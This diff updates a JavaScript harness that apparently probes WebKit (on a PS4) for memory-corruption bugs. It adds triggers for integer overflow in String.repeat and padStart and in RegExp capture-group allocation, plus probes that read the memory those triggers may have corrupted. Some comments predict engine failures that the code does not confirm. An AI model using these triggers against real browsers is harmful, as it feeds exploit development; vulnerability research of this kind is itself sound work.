@@ -625,86 +625,102 @@ export const Factory = {
         });
 
         // ══════════════════════════════════════════════════════════════
-        // 12. String Allocation Overflow (WTF::String)
-        //     C++: WTFString.cpp / StringBuilder.cpp
-        //     Risco: ALTO — Um dos maiores causadores de Crash no WebKit
+        // 12. String Math Integer Overflow (O(1) Boundary Bypass)
+        //     C++: WTFString.cpp 
+        //     Risco: ALTO — Tenta enganar o cálculo de alocação sem esgotar a RAM
         // ══════════════════════════════════════════════════════════════
         register({
-            id: 'STRING_BUILDER_OVERFLOW',
+            id: 'STRING_MATH_INTEGER_OVERFLOW',
             category: 'Boundary',
             risk: 'HIGH',
             description: [
-                'Força a classe WTF::String do C++ a concatenar strings para além do limite',
-                'do alocador seguro. Um cálculo de buffer incorreto resultará em Segfault',
-                'ou OOB Read/Write.'
+                'Testa o transbordo de inteiros na matemática de strings do WebKit.',
+                'Utiliza funções que calculam o tamanho final (length) antes de iterar,',
+                'evitando o travamento da CPU. Se o cálculo de 32-bits der a volta,',
+                'a string resultante apontará para memória inválida.'
             ].join(' '),
 
             setup: function() {
-                // Criamos um bloco base gigantesco (mas dentro do limite legal)
-                // 2^28 = ~268 MB de string
-                this.baseStr = "A".repeat(0x10000000); 
+                // Usamos uma string minúscula para não esgotar a RAM da PS4
+                this.smallStr = "A";
             },
 
             trigger: function() {
                 try {
-                    // GATILHO 1: PadStart com cálculos matemáticos massivos
-                    this.corrupted = this.baseStr.padStart(0x7FFFFFFF, "B");
-                    
-                    // GATILHO 2: Substituição exponencial
-                    this.corrupted = this.baseStr.replace(/A/g, "BBBB");
-                } catch(e) {
-                    // Omitimos o RangeError ou OutOfMemory esperado
-                }
+                    // GATILHO 1: O motor C++ vai calcular: 1 (tamanho) * 0xFFFFFFFF
+                    // Se o resultado for truncado (Integer Overflow), ele aloca 0 bytes,
+                    // mas tenta escrever o "A" nessa memória!
+                    this.corrupted = this.smallStr.repeat(0xFFFFFFFF);
+                } catch(e) { }
+
+                try {
+                    // GATILHO 2: PadStart
+                    // O C++ tenta calcular a diferença: 0xFFFFFFFF - 1
+                    this.corrupted = this.smallStr.padStart(0xFFFFFFFF, "B");
+                } catch(e) { }
             },
 
             probe: [
-                s => typeof s.corrupted,
-                // Tentativa de leitura na extremidade do buffer corrompido
-                s => s.corrupted ? s.corrupted.charCodeAt(0x7FFFFFFF) : null 
+                // Se a string foi criada sem lançar RangeError, o cálculo falhou.
+                s => s.corrupted ? s.corrupted.length : null,
+                
+                // Tentativa de ler a memória alocada incorretamente
+                s => s.corrupted ? s.corrupted.charCodeAt(0) : null
             ],
 
             cleanup: function() {
-                this.baseStr = null;
+                this.smallStr = null;
                 this.corrupted = null;
             }
         });
         
         // ══════════════════════════════════════════════════════════════
-        // 13. RegExp Catastrophic Backtracking & Buffer Overflow
+        // 13. RegExp Capture Group Limit (Parser Heap Overflow)
         //     C++: Yarr (WebKit Regex Engine)
-        //     Risco: MÉDIO — Causa Denial of Service fácil, mas às vezes corrompe memória
+        //     Risco: ALTO — Ataca os limites do parser sem causar ReDoS
         // ══════════════════════════════════════════════════════════════
         register({
-            id: 'REGEXP_ENGINE_BUFFER_OVERFLOW',
+            id: 'REGEXP_GROUP_INTEGER_OVERFLOW',
             category: 'Boundary',
-            risk: 'MEDIUM',
+            risk: 'HIGH',
             description: [
-                'Estressa o motor de Expressões Regulares (Yarr) com padrões complexos',
-                'e grupos de captura profundos. O objetivo é causar um estouro de pilha (Stack Overflow)',
-                'ou corromper os buffers internos de captura.'
+                'Em vez de causar Catastrophic Backtracking (CPU Hang), ataca o buffer',
+                'de alocação de grupos de captura () do compilador C++. Se o limite',
+                'exceder 16-bits ou 32-bits, o motor pode subscrever os metadados do RegExp.'
             ].join(' '),
 
             setup: function() {
-                // Expressão Regular projetada para causar exaustão matemática
-                this.regex = new RegExp("(a+)+b");
-                this.payload = "a".repeat(50000) + "c"; // Nunca vai bater (fail match)
+                // Criamos uma expressão com milhares de grupos de captura válidos.
+                // Isto testa se o parser em C++ estoura o contador interno (uint16_t ou uint32_t)
+                // ao pré-alocar os arrays de resultados, sem causar loops infinitos.
+                try {
+                    // 0xFFFF é o limite de 16-bits. Passar disso pode bugar o WebKit antigo.
+                    let groups = "()".repeat(0xFFFF + 1); 
+                    this.regex = new RegExp(groups);
+                } catch(e) {}
             },
 
             trigger: function() {
                 try {
-                    // O motor C++ Yarr tentará calcular todas as combinações possíveis.
-                    // Em navegadores vulneráveis, isto estoura o ponteiro de pilha do sistema.
-                    this.result = this.regex.exec(this.payload);
+                    if (this.regex) {
+                        // Uma execução instantânea (vazia). O foco aqui é forçar
+                        // o C++ a devolver o array massivo de grupos de captura.
+                        this.result = this.regex.exec("");
+                    }
                 } catch(e) {}
             },
 
             probe: [
-                s => s.result
+                // Se o tamanho do resultado for menor que o esperado, ocorreu um transbordo (wrap-around)
+                s => s.result ? s.result.length : null,
+                
+                // Tenta aceder ao primeiro índice da memória possivelmente corrompida
+                s => s.result ? s.result[1] : null
             ],
 
             cleanup: function() {
                 this.regex = null;
-                this.payload = null;
+                this.result = null;
             }
         });
         return list;
